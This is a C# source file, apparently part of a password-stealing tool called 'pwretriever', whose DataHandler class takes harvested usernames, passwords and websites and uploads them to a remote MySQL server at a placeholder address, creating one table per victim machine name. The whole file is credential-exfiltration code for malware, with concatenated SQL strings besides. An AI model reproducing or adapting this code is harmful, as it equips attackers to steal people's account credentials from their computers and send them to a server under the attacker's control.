using System;
using System.CodeDom;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using MySql.Data.MySqlClient;

namespace xoxoxo
{
    public class DataHandler
    {
        private List<Credentials> GetCredentialsList(List<string> usernames, List<string> passwords,
            List<string> websites)
        {
            return usernames.Select((t, i) => new Credentials(t, passwords[i], websites[i])).ToList();
        }

        public void SendDataToWeb(List<string> usernames, List<string> passwords, List<string> websites)
        {
            var credentialsList = GetCredentialsList(usernames, passwords, websites);
            var machineName = Environment.MachineName;
            var connection = new MySqlConnection("Server=SERVER_IP_GOES_HERE;Database=pwretriever;Uid=ID_GOES_HERE;Pwd=PASS_GOES_HERE");
            connection.Open();
            new MySqlCommand(
                    "CREATE TABLE IF NOT EXISTS " + RemoveSpecialCharacters(machineName) +
                    "(Username VARCHAR(1000), Password VARCHAR(1000), Website VARCHAR(1000), Time TIMESTAMP)",
                    connection)
                .ExecuteReader().Close();
            foreach (var credentials in credentialsList)
                new MySqlCommand(
                    "INSERT INTO " + RemoveSpecialCharacters(machineName) +
                    "(Username, Password, Website, Time) VALUES('" + ToLiteral(credentials.Username) + "', '" +
                    ToLiteral(credentials.Password) + "', '" + ToLiteral(credentials.Website) + "'," +
                    ToLiteral(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")) + ")", connection).ExecuteReader().Close();
            connection.Close();
            connection.Dispose();
        }

        public void SendDataToWeb(List<Credentials> credentials)
        {
            var machineName = Environment.MachineName;
            var connection = new MySqlConnection("Server=SERVER_IP_GOES_HERE;Database=pwretriever;Uid=ID_GOES_HERE;Pwd=PASSWORD_GOES_HERE");
            connection.Open();
            new MySqlCommand(
                    "CREATE TABLE IF NOT EXISTS " + RemoveSpecialCharacters(machineName) +
                    "(Username VARCHAR(1000), Password VARCHAR(1000), Website VARCHAR(1000), Time TIMESTAMP)",
                    connection)
                .ExecuteReader().Close();
            foreach (var credential in credentials)
                new MySqlCommand(
                    "INSERT INTO " + RemoveSpecialCharacters(machineName) +
                    "(Username, Password, Website, Time) VALUES('" + ToLiteral(credential.Username) + "', '" +
                    ToLiteral(credential.Password) + "', '" + ToLiteral(credential.Website) + "'," +
                    ToLiteral(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")) + ")", connection).ExecuteReader().Close();
            connection.Close();
            connection.Dispose();
        }

        private string RemoveSpecialCharacters(string str)
        {
            var stringBuilder = new StringBuilder();
            foreach (var ch in str.Where(c =>
            {
                if ((c < 48 || c > 57) && (c < 65 || c > 90) && (c < 97 || c > 122) && c != 46)
                    return (int) c == 95;
                return true;
            }))
                stringBuilder.Append(ch);
            return stringBuilder.ToString();
        }

        private string ToLiteral(string input)
        {
            using (var stringWriter = new StringWriter())
            {
                using (var provider = CodeDomProvider.CreateProvider("CSharp"))
                {
                    provider.GenerateCodeFromExpression(new CodePrimitiveExpression(input), stringWriter, null);
                    return stringWriter.ToString();
                }
            }
        }
    }
}